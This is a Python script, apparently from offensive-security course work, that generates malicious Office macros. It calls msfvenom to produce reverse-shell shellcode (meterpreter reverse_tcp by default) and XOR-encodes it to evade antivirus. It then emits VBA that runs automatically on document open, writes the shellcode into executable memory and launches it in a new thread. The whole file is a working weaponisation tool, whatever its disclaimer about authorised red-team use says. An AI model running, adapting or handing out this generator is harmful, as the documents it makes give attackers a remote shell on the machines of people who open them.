#!/usr/bin/env python3
import subprocess
import argparse
import logging
import sys

# This script generates a VBA macro that decodes and executes shellcode using msfvenom.
# It uses XOR encoding to obfuscate the shellcode, making it less detectable by antivirus software.
# The generated macro can be used in Microsoft Office documents to execute the shellcode when the document is opened.

# Usage:
# python macrogen.py --payload windows/meterpreter/reverse_tcp --lhost tun0 --lport 4444 --key 250 -o output.vba

# Requirements:
# - msfvenom (part of Metasploit Framework)
# - Python 3.x

# This script is intended for educational purposes and authorized red team engagements 
# and should not be used for malicious activities.

# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2023 Your Name
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.


def generate_shellcode(
    payload: str = 'windows/meterpreter/reverse_tcp',
    lhost: str = 'tun0', # Assuming tun interface for course/exam work
    lport: int = 4444,
    verbose: bool = False
) -> bytes:
    """
    Generate raw shellcode using msfvenom.

    Args:
        payload (str): The msfvenom payload to use.
        lhost (str): The LHOST value for the payload.
        lport (int): The LPORT value for the payload.
        verbose (bool): Enable verbose logging.

    Returns:
        bytes: The generated shellcode.

    Raises:
        RuntimeError: If msfvenom fails to generate shellcode.
    """
    cmd = [
        'msfvenom',
        '-p', payload,
        'LHOST=' + lhost,
        'LPORT=' + str(lport),
        '-f', 'raw'
    ]
    if verbose:
        logging.info(f"Running msfvenom with: {' '.join(cmd)}")
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if proc.returncode != 0:
        logging.error(f"msfvenom failed: {proc.stderr.decode(errors='ignore')}")
        raise RuntimeError("msfvenom failed")
    return proc.stdout

def xor_encode(
    shellcode_bytes: bytes,
    key: int = 250,
    verbose: bool = False
) -> bytes:
    """
    XOR-encode shellcode bytes with a given key.

    Args:
        shellcode_bytes (bytes): The shellcode to encode.
        key (int): The XOR key.
        verbose (bool): Enable verbose logging.

    Returns:
        bytes: The XOR-encoded shellcode.
    """
    if verbose:
        logging.info(f"XOR encoding shellcode with key: {key}")
    return bytes(b ^ key for b in shellcode_bytes)

def generate_vba_macro(
    encoded_shellcode: bytes,
    key: int = 250,
    verbose: bool = False
) -> str:
    """
    Generate a VBA macro that will decode and execute the provided shellcode.

    Args:
        encoded_shellcode (bytes): The XOR-encoded shellcode.
        key (int): The XOR key used for encoding.
        verbose (bool): Enable verbose logging.

    Returns:
        str: The VBA macro as a string.
    """
    array_lines = []
    line = []
    for i, b in enumerate(encoded_shellcode):
        line.append(str(b))
        if len(line) == 15 or i == len(encoded_shellcode) - 1:
            array_lines.append(', '.join(line))
            line = []
    array_str = ', _\n    '.join(array_lines)
    if verbose:
        logging.info(f"Encoded shellcode VBA array length: {len(encoded_shellcode)}")
    vba = f'''Private Declare Function Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) As Long
Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, _
    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByVal dest As Long, ByRef source As Any, _
    ByVal size As Long)

Sub LegitMacro()
    Dim buf As Variant
    Dim addr As Long
    Dim i As Long
    Dim data As Byte
    Dim res As Long
    Dim threadId As Long
    
    buf = Array({array_str})
    
    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
    If addr = 0 Then
        MsgBox "VirtualAlloc failed", vbCritical
        Exit Sub
    End If
    
    ' Decode shellcode by XOR with {key}
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor {key}
    Next i
    
    For i = 0 To UBound(buf)
        data = buf(i)
        RtlMoveMemory addr + i, data, 1
    Next i
    
    res = CreateThread(0, 0, addr, 0, 0, threadId)
End Sub

Sub Document_Open()
    LegitMacro
End Sub

Sub AutoOpen()
    LegitMacro
End Sub
'''
    return vba

def main() -> None:
    """
    Parse command-line arguments and generate a VBA macro with XOR-encoded shellcode.
    """
    parser = argparse.ArgumentParser(description="Generate VBA macro with XOR-encoded shellcode using msfvenom.")
    parser.add_argument('--payload', default='windows/meterpreter/reverse_tcp', help='msfvenom payload (default: windows/meterpreter/reverse_tcp)')
    parser.add_argument('--lhost', default='tun0', help='LHOST for msfvenom (default: tun0)')
    parser.add_argument('--lport', type=int, default=4444, help='LPORT for msfvenom (default: 4444)')
    parser.add_argument('--key', type=int, default=250, help='XOR key (default: 250)')
    parser.add_argument('-o', '--output', help='Output file for VBA macro (default: print to stdout)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity')
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO if args.verbose else logging.WARNING,
        format='[%(levelname)s] %(message)s'
    )

    try:
        shellcode = generate_shellcode(args.payload, args.lhost, args.lport, verbose=args.verbose)
        encoded = xor_encode(shellcode, key=args.key, verbose=args.verbose)
        vba_code = generate_vba_macro(encoded, key=args.key, verbose=args.verbose)
        if args.output:
            with open(args.output, 'w') as f:
                f.write(vba_code)
            logging.info(f"VBA macro written to {args.output}")
        else:
            print(vba_code)
    except Exception as e:
        logging.error(str(e))
        sys.exit(1)

if __name__ == "__main__":
    main()